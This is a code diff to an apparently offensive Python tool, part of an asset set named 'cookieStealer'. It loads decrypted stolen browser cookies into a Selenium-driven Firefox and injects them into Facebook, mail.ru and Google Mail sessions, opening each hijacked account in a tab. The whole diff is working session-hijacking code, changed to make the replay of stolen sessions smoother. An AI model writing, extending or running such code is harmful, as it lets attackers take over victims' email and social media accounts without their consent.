@@ -38,11 +38,14 @@ from selenium import webdriver
 log('[*] modules imported [+]')
 sessions = ast.literal_eval(mprint)
 log('[*] mprint decrypted')
+
 def chrome_sessions(sessions):
     from selenium import webdriver
     from selenium.webdriver.common.keys import Keys
-    import time
+    import os
+    import sys
     cookies = sessions
+    sites = []
     urls = {
         u'.facebook.com': u'https://www.facebook.com',
         u'.mail.ru': u'https://e.mail.ru',
@@ -52,18 +55,27 @@ def chrome_sessions(sessions):
         u'accounts.google.com': u'https://mail.google.com',
     }
     driver_chrome = webdriver.Firefox()
+    loading_html = os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'loading.html').replace('\\', '/')
+    ready_html = os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'ready.html').replace('\\', '/')
     l = []
     for dics in cookies:
         l.append(dics['domain'])
     domains = set(l)
+    driver_chrome.get('file://'+loading_html)
     for domain in domains:
+        driver_chrome.refresh()
+        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
         driver_chrome.get(urls[domain])
         for cookie in cookies:
             if cookie['domain'] == domain:
                 driver_chrome.add_cookie(cookie)
+        sites.append(urls[domain])
+        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 'w')
+    filter_sites = set(sites)
+    for i in filter_sites:
         driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
-    for i in range(len(domains)+1):
-        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + str(i))
-        driver_chrome.refresh()
+        driver_chrome.get(i)
+    driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + '1')
+    driver_chrome.get('file://'+ready_html)
 chrome_sessions(sessions)
 """
